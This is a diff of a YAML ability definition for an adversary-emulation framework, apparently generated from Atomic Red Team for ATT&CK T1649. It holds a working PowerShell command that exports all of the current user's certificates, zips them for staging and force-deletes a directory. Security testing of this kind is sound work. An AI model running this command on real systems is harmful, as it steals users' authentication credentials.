@@ -1,7 +1,8 @@
 - id: 290ecfe6-5708-4753-afc4-9404d34c71a2
-  name: Steal or Forge Authentication Certificates
-  description: Ability for Steal or Forge Authentication Certificates (ATT&CK T1649).
-    Generated from Atomic Red Team procedures; review and test safely before use.
+  name: Staging Local Certificates via Export-Certificate (Generated from Atomic Red Team)
+  description: |
+    Ability for Steal or Forge Authentication Certificates (ATT&CK T1649).
+    Generated from Atomic Red Team procedures (eb121494-82d1-4148-9e2b-e624e03fbf3d); review and test safely before use.
   tactic: credential-access
   technique:
     attack_id: T1649
@@ -9,9 +10,16 @@
   platforms:
     windows:
       psh:
-        command: $archive="$env:PUBLIC\T1649\atomic_certs.zip" $exfilpath="$env:PUBLIC\T1649\certs"
-          Add-Type -assembly "system.io.compression.filesystem" Remove-Item $(split-path
-          $exfilpath) -Recurse -Force -ErrorAction Ignore mkdir $exfilpath | Out-Null
-          foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert
-          $cert -FilePath $exfilpath\$($cert.FriendlyName).cer} [io.compression.zipfile]::CreateFromDirectory($exfilpath,
-          $archive)
+        command: |
+          $archive="#{host.dir.staged}\atomic_certs.zip";
+          $exfilpath="#{host.dir.staged}\certs";
+          Add-Type -assembly "system.io.compression.filesystem";
+          Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore;
+          mkdir $exfilpath | Out-Null;
+          foreach ($cert in (gci Cert:\CurrentUser\My)) {
+            Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer
+          }
+          [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.dir.staged
